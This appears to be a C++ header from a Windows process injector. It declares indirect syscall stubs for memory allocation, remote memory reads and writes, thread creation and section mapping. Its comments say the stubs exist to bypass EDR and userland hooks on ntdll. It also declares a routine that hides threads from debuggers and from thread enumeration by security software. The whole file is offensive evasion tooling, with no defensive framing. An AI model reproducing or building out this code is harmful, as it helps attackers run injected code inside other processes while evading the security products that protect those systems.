// language: C++, target: Windows 11, MSVC (x64)
// Indirect syscall stubs built by the injector at runtime.
// The core DLL receives a table of {ssn, gadget} pairs; every privileged call
// goes through here instead of the ntdll export so ntdll's syscall page is
// never touched and EDR/userland hooks on the export are bypassed.
#pragma once
#include <cstdint>
#include <cstddef>
#include <windows.h>
#include <winternl.h>

namespace gfx::sys {

// One entry per syscall we need. Gadget is a jmp [ntdll+offset] trampoline
// resolved from a clean copy of ntdll mapped by the injector.
struct SyscallEntry {
    uint32_t ssn;        // system service number (per-build, re-derive)
    void*    gadget;     // jmp gadget inside ntdll's syscall gate
};

struct SyscallTable {
    SyscallEntry allocate_virtual_memory;   // NtAllocateVirtualMemory
    SyscallEntry protect_virtual_memory;    // NtProtectVirtualMemory
    SyscallEntry create_thread_ex;          // NtCreateThreadEx
    SyscallEntry map_view_of_section;       // NtMapViewOfSection
    SyscallEntry create_section;            // NtCreateSection
    SyscallEntry query_system_info;         // NtQuerySystemInformation
    SyscallEntry open_process;              // NtOpenProcess
    SyscallEntry read_virtual_memory;       // NtReadVirtualMemory
    SyscallEntry write_virtual_memory;      // NtWriteVirtualMemory
    SyscallEntry close;                     // NtClose
    SyscallEntry set_information_thread;    // NtSetInformationThread (hide from debugger)
};

// Populated by the injector before the DLL entry runs (via g_syscalls export).
SyscallTable* get_table();
void          set_table(SyscallTable* t);

// NTSTATUS NtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG)
NTSTATUS allocate(void* proc, void** base, std::size_t* size, uint32_t prot, uint32_t type);
NTSTATUS protect(void* proc, void** base, std::size_t* size, uint32_t prot, uint32_t* old);
NTSTATUS create_thread(void* proc, void** handle, uint32_t access, void* attr,
                       uint32_t flags, void* start, void* param, bool suspended);
NTSTATUS open_process(uint32_t desired_access, bool inherit, uint32_t pid, void** handle);
NTSTATUS read_mem(void* proc, void* addr, void* buf, std::size_t size, std::size_t* read);
NTSTATUS write_mem(void* proc, void* addr, const void* buf, std::size_t size, std::size_t* written);

// Static-TLS evasion: mark the current thread hidden from NtQuerySystemInformation
// thread enumeration (what Karmuda/EDR uses to find nameless threads).
NTSTATUS hide_current_thread(void* proc_handle);

// Direct NtQuerySystemInformation for the boot smoke test.
NTSTATUS query_system_info(uint32_t cls, void* buf, uint32_t size, uint32_t* retlen);

} // namespace gfx::sys